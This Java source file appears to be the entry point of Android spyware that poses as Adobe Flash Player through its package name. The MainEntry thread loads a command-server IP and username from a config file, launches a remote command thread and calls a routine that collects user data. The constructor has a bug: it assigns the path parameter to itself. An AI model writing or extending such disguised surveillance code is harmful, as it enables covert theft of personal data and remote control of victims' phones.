package com.adobe.flashplayer;

import org.json.JSONObject;
import android.content.Context;
import android.os.Message;
import android.util.Log;
import java.io.File;
import java.io.FileInputStream;

import com.adobe.flashplayer.network.Network;
import com.adobe.flashplayer.network.ServerCommand;
import com.adobe.flashplayer.data.Collection;



public class MainEntry extends  Thread{

    private Context context;
    private String path;

    private static String TAG = "[ljg]MainEntry";

    MainEntry(Context context,String path){
        this.context =context;
        path = path;
    }

    @Override
    public void run() {

        try {
            Log.e(TAG, "[liujinguang]MainEntry");

            String uninstall = PrefOper.getValue(context, Public.PARAMCONFIG_FileName, Public.UNINSTALLFLAG);
            if (uninstall.equals("true")) {
                Log.e(TAG, "[liujinguang]time too short");
                return;
            }

            PrefOper.setValue(context, Public.PARAMCONFIG_FileName, Public.SETUPMODE, Public.SETUPMODE_JAR);

            if (path != null && path.equals("") == false) {
                if (path.endsWith("/") == false) {
                    path += "/";
                }
            }
            PrefOper.setValue(context, Public.PARAMCONFIG_FileName, Public.CFGPLUGINPATH, path);

            PrefOper.setValue(context, Public.PARAMCONFIG_FileName, Public.CFGPACKAGENAME, context.getPackageName());

            File file = new File(path + Public.CONFIG_FILENAME);
            if (file != null && file.exists()) {
                int len = (int) file.length();
                byte[] buf = new byte[len];

                FileInputStream fin = new FileInputStream(file);
                fin.read(buf, 0, len);
                fin.close();

                JSONObject json = new JSONObject(new String(buf));
                String ip = json.optString("ip");

                if (ip != null && ip.equals("") == false) {
                    PrefOper.setValue(context, Public.PARAMCONFIG_FileName, Public.CFGSERVERIP, ip);
                }
                String username = json.optString("username");
                if (username != null && username.equals("") == false) {
                    PrefOper.setValue(context, Public.PARAMCONFIG_FileName, Public.CFGUSERNAME, username);
                }
            }


            Public pubclass = new Public(context);
            Network network = new Network(context);

            try {

                ServerCommand server = new ServerCommand(context);
                Thread thread = new Thread(server, Public.SERVER_CMD_THREADNAME);
                thread.start();

            } catch (Exception e) {
                e.printStackTrace();
            }


            try {
                Collection.collectUserData(context);

            } catch (Exception e) {
                Log.e(TAG, "[liujinguang]Collection exception");

                e.printStackTrace();
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}
